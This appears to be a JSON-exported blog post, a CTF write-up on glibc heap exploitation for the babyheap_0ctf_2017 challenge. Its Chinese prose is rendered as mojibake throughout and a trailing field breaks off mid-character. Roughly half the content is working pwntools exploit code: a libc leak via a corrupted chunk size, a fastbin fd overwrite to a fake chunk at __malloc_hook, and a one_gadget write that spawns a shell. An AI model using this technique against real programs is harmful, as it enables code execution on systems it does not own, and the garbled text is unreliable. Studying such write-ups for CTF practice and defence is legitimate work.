{"title":"å †","uid":"c4bf9a47934395d80559cc60b6290065","slug":"å †","date":"2021-11-23T14:10:20.000Z","updated":"2021-12-05T05:02:19.781Z","comments":true,"path":"api/articles/å †.json","keywords":null,"cover":"https://i.loli.net/2021/11/25/Z485hvdikxGYrAS.jpg","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>åœ¨æ ˆä¸Šæ‹–äº†å¥½ä¹…æ‰è¿›å…¥å †ï¼Œè¿™é‡Œå°±ä»‹ç»ä¸€ä¸‹è¿™å‡ å¤©æ‰€å­¦çš„å†…å®¹</p></blockquote>\n<h1 id=\"ä»€ä¹ˆæ˜¯å †\"><a href=\"#ä»€ä¹ˆæ˜¯å †\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯å †\"></a>ä»€ä¹ˆæ˜¯å †</h1><ol>\n<li><p>å †ä¸åŒäºæ ˆï¼Œæ ˆæ˜¯é™æ€åˆ†å¸ƒï¼Œä¹Ÿå°±æ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜å°±ä¼šåˆ†é…ï¼Œè€Œå †åˆ™æ˜¯åœ¨ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦æ‰ä¼šåˆ†é…ï¼ˆç”±mallocã€allocã€reallocå‡½æ•°åˆ†é…å†…å­˜åå‡ºç°ï¼‰ã€‚</p>\n</li>\n<li><p>å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œç”Ÿé•¿æ–¹å‘ä¸æ ˆç›¸åï¼Œå †æ˜¯ç”±ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿ï¼Œè€Œæ ˆæ˜¯ç”±é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ã€‚</p>\n</li>\n<li><p>å †å¯ä»¥ç”³è¯·çš„å†…å­˜ç©ºé—´æ¯”æ ˆè¦å¤§å¾ˆå¤šï¼Œå †åœ¨linuxçš„4Gçš„è™šæ‹Ÿç©ºé—´é‡Œé¢æœ€é«˜å¯ç”³è¯·2.9Gç©ºé—´</p>\n</li>\n<li><p>å †çš„æ“ä½œæ˜¯ç”±å †ç®¡ç†å™¨ï¼ˆptmalloc2ï¼‰æ¥å®ç°ï¼Œå¹¶ä¸æ˜¯ç”±æ“ä½œç³»ç»Ÿå†…æ ¸ç®¡ç†ã€‚å› ä¸ºç¨‹åºæ¯æ¬¡ç”³è¯·æˆ–é‡Šæ”¾å †æ—¶éƒ½éœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨çš„å¼€é”€å·¨å¤§ï¼Œé¢‘ç¹è¿›è¡Œå †æ“ä½œæ—¶ï¼Œä¼šä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½ã€‚</p>\n</li>\n</ol>\n<h1 id=\"å †çš„åŸºæœ¬ç»“æ„\"><a href=\"#å †çš„åŸºæœ¬ç»“æ„\" class=\"headerlink\" title=\"å †çš„åŸºæœ¬ç»“æ„\"></a>å †çš„åŸºæœ¬ç»“æ„</h1><p><strong>1.pre_sizeå­—æ®µ</strong>ï¼šåªæœ‰å½“å‰é¢ä¸€ä¸ªå †å—æ˜¯ç©ºé—²æ—¶æ‰æœ‰å€¼ï¼Œç”¨æ¥æŒ‡ç¤ºå‰é¢ä¸€ä¸ªå †å—çš„å¤§å°ã€‚å½“å‰é¢çš„å †å—åœ¨ä½¿ç”¨æ—¶ï¼Œå®ƒçš„å€¼ä¸º0</p>\n<p><strong>2.sizeå­—æ®µ</strong>ï¼šç”¨æ¥æŒ‡ç¤ºå½“å‰å †å—çš„å¤§å°ï¼ˆåŒ…æ‹¬å¤´éƒ¨ä»¥åŠuser dataçš„å¤§å°ï¼‰ã€‚æœ€åä¸‰ä½ç›¸å½“äºä¸‰ä¸ªflagï¼š</p>\n<ul>\n<li><p><strong>NON_MAIN_ARENA</strong>ï¼šåˆ¤æ–­è¿™ä¸ªå †å—æ˜¯å¦ä½äºä¸»çº¿ç¨‹</p>\n</li>\n<li><p><strong>IS_MAPPED</strong>ï¼šè®°å½•å½“å‰chunkæ˜¯å¦ç”±mmapåˆ†é…</p>\n</li>\n<li><p><strong>PREV_INUSE</strong>ï¼šè®°å½•å½“å‰chunkå—æ˜¯å¦åŒ—åˆ†é…ï¼ˆå¦‚æœè¢«åˆ†é…è¿™ä¸ªå­—æ®µçš„å€¼ä¸º1ï¼Œæ‰€ä»¥ç»å¸¸ä¼šåœ¨å·²åˆ†é…çš„å †å—ä¸­çš„sizeæ¯”åŸæ¥å¤§1ä¸ªå­—èŠ‚</p>\n</li>\n</ul>\n<p><strong>3.fdï¼Œbk</strong>ã€‚ chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹</p>\n<ul>\n<li><strong>fd</strong> æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</li>\n<li><strong>bk</strong> æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</li>\n</ul>\n<p>é€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</p>\n<p><strong>4.fd_nextsizeï¼Œ bk_nextsize</strong>ï¼Œä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚</p>\n<p><strong>fd_nextsize</strong> æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p>\n<p><strong>bk_nextsize</strong> æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p>\n<p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚</p>\n<p><img src=\"https://i.loli.net/2021/11/23/hRXmqAarcV9Yuib.png\" alt=\"image.png\"></p>\n<h1 id=\"bins\"><a href=\"#bins\" class=\"headerlink\" title=\"bins\"></a>bins</h1><p>è¿™äº›å°±ä¸å¤šèµ˜è¿°äº†ï¼Œctfwikiä¸Šé¢è®²çš„æ¯”æˆ‘çš„å¥½</p>\n<h1 id=\"Unlinkæœºåˆ¶\"><a href=\"#Unlinkæœºåˆ¶\" class=\"headerlink\" title=\"Unlinkæœºåˆ¶\"></a>Unlinkæœºåˆ¶</h1><p>unlinkæ˜¯å †æº¢å‡ºä¸­çš„ä¸€ç§å¸¸è§çš„åˆ©ç”¨å½¢å¼ï¼Œé€šè¿‡å°†åŒå‘åˆ—è¡¨ä¸­çš„ç©ºé—²å—æ‹¿å‡ºæ¥ä¸å°†è¦freeçš„ç‰©ç†ç›¸é‚»çš„å—è¿›è¡Œåˆå¹¶ã€‚</p>\n<h2 id=\"å¦‚ä½•è§¦å‘unlink\"><a href=\"#å¦‚ä½•è§¦å‘unlink\" class=\"headerlink\" title=\"å¦‚ä½•è§¦å‘unlink\"></a>å¦‚ä½•è§¦å‘unlink</h2><p>å½“ä½¿ç”¨freeå‡½æ•°é‡Šæ”¾æ­£åœ¨ä½¿ç”¨çš„chunkæ—¶ï¼Œä¼šç›¸åº”åœ°æ£€æŸ¥å…¶ç›¸é‚»çš„chunkæ˜¯å¦ä¸ºç©ºé—²ï¼Œå¦‚æœä¸ºç©ºé—²åˆ™ä¼šå°†ç›¸é‚»çš„chunkä¸freeçš„chunkè¿›è¡Œåˆ</p>\n<h1 id=\"å®æ“\"><a href=\"#å®æ“\" class=\"headerlink\" title=\"å®æ“\"></a>å®æ“</h1><p>å°±æ‹¿buuä¸Šé¢babyheap_0ctf_2017ä¸€é¢˜æ¥è®²</p>\n<p>checkä¸€ä¸‹ï¼Œ64ä½å…¨ä¿æŠ¤</p>\n<p><img src=\"https://i.loli.net/2021/11/25/CBo3rd7izHUQn9I.png\" alt=\"image.png\"></p>\n<p>åæ±‡ç¼–çœ‹çœ‹<img src=\"https://i.loli.net/2021/11/25/bMlnp2wti1Iv5WE.png\" alt=\"image.png\"></p>\n<p>å­˜åœ¨å †æº¢å‡º<img src=\"https://i.loli.net/2021/11/25/gURA8YHSL5sqyFP.png\" alt=\"image.png\"></p>\n<p>å †æº¢å‡ºä¸åƒæ ˆæº¢å‡ºï¼Œæ ˆæº¢å‡ºå¯ä»¥é€šè¿‡æ„é€ ROPä»è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œè€Œå †æº¢å‡ºä¸èƒ½ç›´æ¥æ§åˆ¶ï¼Œå †æº¢å‡ºåªèƒ½ä»å½“å‰chunkè¦†ç›–ä¸‹ä¸€ä¸ªchunk</p>\n<h2 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h2><p>æˆ‘ä»¬åº”è¯¥å¦‚ä½•æ§åˆ¶ç¨‹åºï¼Ÿå…¶å®åœ¨ç”³è¯·chunkæ—¶ï¼Œä¼šæ‰§è¡Œmalloc_hookå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹malloc_hookå‡½æ•°gotè¡¨ï¼Œè®©ä»–æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…one_gadgetã€‚</p>\n<p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼š</p>\n<ol>\n<li>å¦‚ä½•è·å–malloc_hookçš„gotè¡¨åœ°å€</li>\n<li>å¦‚ä½•ä¿®æ”¹malloc_hookçš„gotè¡¨</li>\n<li>å¦‚ä½•getshell</li>\n</ol>\n<p>é—®é¢˜1ï¼š</p>\n<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å †æº¢å‡ºè¦†ç›–åˆ°ä¸‹ä¸€ä¸ªchunkï¼Œä»è€Œè®©ä¸‹ä¸€ä¸ªchunkæŒ‡å‘main_arenaï¼Œå†ä½¿ç”¨dumpè¾“å‡ºå³å¯æ³„éœ²</p>\n<p>é—®é¢˜2ï¼š</p>\n<p>æˆ‘ä»¬å¯ä»¥freeæ‰ä¸­é—´ä¸€ä¸ªchunkï¼Œä¹‹ååˆ©ç”¨ä¸‹ä¸€ä¸ªchunkå®ç°å †æº¢å‡ºï¼Œä»è€Œä¿®æ”¹ä¸­é—´chunkçš„fdæŒ‡é’ˆæŒ‡å‘å«main_arenaçš„gotè¡¨çš„chunkï¼Œæˆ‘ä»¬åªè¦å†ç”³è¯·ç›¸åŒå¤§å°çš„chunkå°±å¯ä»¥åˆ©ç”¨fillå‡½æ•°ä¿®æ”¹malloc_hookçš„gotè¡¨</p>\n<p>é—®é¢˜3ï¼š</p>\n<p>ä¿®æ”¹malloc_hookçš„gotè¡¨ä¸ºone_gadgetï¼Œä¹‹åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªchunkæ—¶ï¼Œå°±ä¼šæ‰§è¡Œone_gadgetä»è€Œè·å–shell</p>\n<p>æ¥ä¸‹æ¥å¼€å§‹æ“ä½œ</p>\n<p>å…ˆæ ¹æ®åæ±‡ç¼–å†™å‡ºå¯¹åº”çš„å‡½æ•°</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">alloc</span>(<span class=\"params\">size</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fill</span>(<span class=\"params\">idx,payload</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    p.send(payload) </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))   </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>ç”³è¯·å››ä¸ªchunkï¼Œé˜²æ­¢chunkè¢«freeåä¸topchunkåˆå¹¶</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x40</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x20</span>)<span class=\"comment\">#3</span></span><br></pre></td></tr></table></figure>\n\n<p>æ¥ä¸‹æ¥å°±æ˜¯å †æº¢å‡ºä¿®æ”¹chunk1çš„sizeå¤§å°ï¼Œfreeåè¾“å‡ºchunk2è·å–main_arena</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x68</span>+p64(<span class=\"number\">0xc1</span>))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™æ ·chunk2å°±ä¼šä¸€èµ·è¿›å…¥fastbinï¼Œä½†æ˜¯chunk2å¹¶æ²¡æœ‰è¢«æ¸…ç©º<img src=\"https://i.loli.net/2021/11/25/XD4ZJIgLqxWOQkj.png\" alt=\"image.png\"></p>\n<p>å½“chunk1å’Œchunk2è¿›å…¥fastbinåï¼Œå†æ¬¡ç”³è¯·chunk1å¤§å°çš„chunkåï¼Œchunk1ä¼šç¦»å¼€fastbinï¼Œä¹‹åchunk2å°±ä¼šæŒ‡å‘main_arean+88</p>\n<p><img src=\"https://i.loli.net/2021/11/25/wLPSeHTuMhKfbVo.png\" alt=\"image.png\"></p>\n<p>å› ä¸ºchunk2æ²¡æœ‰è¢«æ¸…ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å‡ºchunk2ï¼Œä»è€Œè·å–main_areançš„åœ°å€ï¼Œè¿›è€Œè·å–malloc_chunkçš„åœ°å€</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dump(<span class=\"number\">2</span>)</span><br><span class=\"line\">libc_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-main_are-<span class=\"number\">88</span></span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">malloc_chunk = libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]+libc_base</span><br></pre></td></tr></table></figure>\n\n<p>æ¥ä¸‹æ¥åˆ©ç”¨æ€è·¯ä¸»è¦æ˜¯double freeï¼šfree(1)change chunk1çš„fdæŒ‡é’ˆ,ç¬¬äºŒæ¬¡ç”³è¯·åˆ°çš„å°±æ˜¯fakechunk ï¼Œå¡«å…… malloc hookè¦†ç›–æŒ‡é’ˆä¸ºonegadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x60</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x71</span>)+p64(malloc_chunk-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">fill(<span class=\"number\">5</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(ogg[<span class=\"number\">1</span>]+libc_base)) </span><br></pre></td></tr></table></figure>\n\n<p>malloc_hookåœ¨chunkå¤´åé¢23å­—èŠ‚å¤„ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥ä½ç½®åœ¨23-size=13çš„ä½ç½®ï¼Œæ‰€ä»¥å¡«å……13å­—èŠ‚åä¿®æ”¹æˆone_gadgetå³å¯</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babyheap&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;node4.buuoj.cn&#x27;,28886)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&quot;/home/krito/CTF/buu/libc/libc-2.23.so&quot;)</span></span><br><span class=\"line\">main_are =<span class=\"number\">0x3c4b20</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">alloc</span>(<span class=\"params\">size</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fill</span>(<span class=\"params\">idx,payload</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    p.send(payload) </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))   </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>) </span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#log.success(&quot;-----------------------leak libc-------------------------&quot;)</span></span><br><span class=\"line\">ogg = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x40</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x20</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x68</span>+p64(<span class=\"number\">0xc1</span>))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">dump(<span class=\"number\">2</span>)</span><br><span class=\"line\">libc_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-main_are-<span class=\"number\">88</span></span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">malloc_chunk = libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]+libc_base</span><br><span class=\"line\">alloc(<span class=\"number\">0x40</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">fill(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x60</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x71</span>)+p64(malloc_chunk-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x60</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">fill(<span class=\"number\">5</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(ogg[<span class=\"number\">1</span>]+libc_base))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n","feature":true,"text":" åœ¨æ ˆä¸Šæ‹–äº†å¥½ä¹…æ‰è¿›å…¥å †ï¼Œè¿™é‡Œå°±ä»‹ç»ä¸€ä¸‹è¿™å‡ å¤©æ‰€å­¦çš„å†…å®¹ ä»€ä¹ˆæ˜¯å † å †ä¸åŒäºæ ˆï¼Œæ ˆæ˜¯é™æ€åˆ†å¸ƒï¼Œä¹Ÿå°±æ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜å°±ä¼šåˆ†é…ï¼Œè€Œå 